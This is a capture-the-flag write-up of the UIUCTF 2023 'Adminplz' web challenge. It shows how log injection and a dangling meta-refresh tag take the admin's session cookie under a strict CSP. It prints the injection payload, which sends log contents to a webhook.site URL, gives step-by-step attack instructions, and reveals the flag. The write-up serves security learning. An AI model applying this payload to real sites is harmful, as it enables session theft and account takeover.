# Adminplz (UIUCTF 2023)

**Challenge category**: Web<br>
**Challenge description**: "your daily dose of ☕"<br>
**Challenge points**: 322<br>
**CTF date**: sab, 01 Lug. 2023, 00:00 UTC — lun, 03 Lug. 2023, 00:00 UTC<br>

## Context

This challenge is about a Dangling Markup (Log) Injection .

## Exploring the challenge



The only thing we can do on this page is logging in and submitting an url to the admin bot. If we access to the /admin endpoint, we'll get an error:

**IMAGE**
Let's have a look at the Java code.
```javascript
const { chromium } = require('playwright-chromium');
const URL = process.argv[2];

(async () => {
    console.log('running admin bot...')
    const browser = await chromium.launch()
    const context = await browser.newContext()
    context.setDefaultTimeout(2000)
    const page = await context.newPage()
    await page.goto('http://127.0.0.1:8080/')

    // login
    await page.type('input[name=username]', 'admin')
    await page.type('input[name=password]', process.env.ADMIN_PASSWORD)
    await Promise.all([
      page.click('input[type=submit]'),
      page.waitForNavigation({
        waitUntil: 'networkidle0',
      }),
    ]);
    // visit url
    console.log("visiting target...");
    await page.goto(URL);
    await page.waitForTimeout(900000); // 15 min
    await browser.close()
    console.log('Success!')
})();
```
For the bot, server is at 127.0.0.1 on port 8080. It logs to the server and then visit the submitted url.
```java
@Component
public class CSP implements Filter {
    @Override
    public void doFilter(ServletRequest request,
                         ServletResponse response,
                         FilterChain chain) throws ServletException, IOException {
        ((HttpServletResponse) response).addHeader("Content-Security-Policy", "default-src 'none';");
        chain.doFilter(request, response);
    }
}

```
CSP is set to <code>default-src 'none'</code>. A very strict policy that prevents any external resource to be loaded and any script to be executed, thus no XSS.
```java
@PostMapping(path = "/login", consumes = {MediaType.APPLICATION_FORM_URLENCODED_VALUE})
    public String login(HttpSession session, User user) {
        if (user.getUsername().equals("admin") && !user.getPassword().equals(ADMIN_PASSWORD)) {
            return "not allowed";
        }
        session.setAttribute("user", user);
        return "logged in";
    }
```
We can't login as admin as we don't know the password, but we can login as any user, our username will be set accordingly (password isn't check).
```java
@GetMapping("/admin")
    public Resource admin(HttpServletRequest req, HttpSession session, @RequestParam String view) {
        if (isLoggedIn(session) && view.contains("flag")) {
            logger.warn("user {} [{}] attempted to access restricted view", ((User) session.getAttribute("user")).getUsername(), session.getId());
        }
        return app.getResource(isAdmin(req, session) ? view : "error.html");
    }
```
Here, two things: our username could be written inside a log (<code>/var/log/adminplz/latest.log</code>) without any sanitizing process and 
a resource specified by a user controllable GET parameter (<code>view</code>) is returned to the admin (if the endpoint is accessed by the admin).
<code>accessResource()</code> method accepts file names and urls (of any protocol).<br>
There is no possibility for an XSS, nor a possibility to inject anything on any page. The only file where we can inject something, if we are logged and 
the <code>view</code> parameter contains the "flag" substring, is <code>/var/log/adminplz/latest.log</code>. This file can be rendered as HTML by the bot's browser.
Submitting an url like <code>http://127.0.0.1:8080/admin?view=file:///var/log/adminplz/latest.log</code> will induce the admin bot to view the log file as an HTML page.
But, what we can do? We can't trigger XSS nor load any external resource. We can't get the /flag.html content. Can we steal cookies even without XSS? Yes.
If we look at the code above (the admin one), we can that not only the username is injected inside the log, but the session ID too. So, if admin visits a url 
like <code>http://127.0.0.1:8080/admin?view=file:///flag.html</code>, its session ID (authentication cookie) is written into the log. If we can exfiltrate this, 
we can authenticate us as admin to the server. In the log there is only text, but we can inject, through the username, HTML code.
How can we exfiltrate the admin cookie with a very strict CSP policy? With a <code>meta</code> tag that redirects the client to an URL that 
incorporate part of the log's content (admin's cookie included):
```html
<html><head><meta http-equiv="refresh" content='0; url=https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b?exf=

...Log's content...

'></head>....
```

## Attack
Steps:
+Login with username <code><html><head><meta http-equiv="refresh" content='0; url=https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b?exf=</code>.
+Visit <code>https://instance_server/admin?view=file:///flag.html</code> (it's important that the <code>view</code> parameter contains a valid path (existent file),
because otherwise an error will be triggered and the log's content resetted, deleting our previous input).
+Submit the url <code>https://127.0.0.1:8080/admin?view=file:///flag.html</code> to the admin bot.
+Login with username <code><html>'></head></code>.
+Visit <code>https://instance_server/admin?view=file:///flag.html</code>.
+Submit the url <code>http://127.0.0.1:8080/admin?view=file:///var/log/adminplz/latest.log</code> to the admin bot.

After executing these steps, our server will receive a GET request with all the exfiltrated content inside a query parameter.

**IMAGE**

Got admin's session ID!
Now we have to use this cookie when accessing the <code>/admin</code> endpoint. In order to access the flag file we have to set the <code>view</code>
parameter to <code>file:///flag.html.</code>, so: <code>https://instance_server/admin?view=file:///flag.html</code>. By Visiting this link we'll get the flag!

**IMAGE**

Flag is <code>uiuctf{adminplz_c4n_1_h4v3_s0M3_co0k13s?_b5eab1cc61c26f07e63af7f8}</code>.

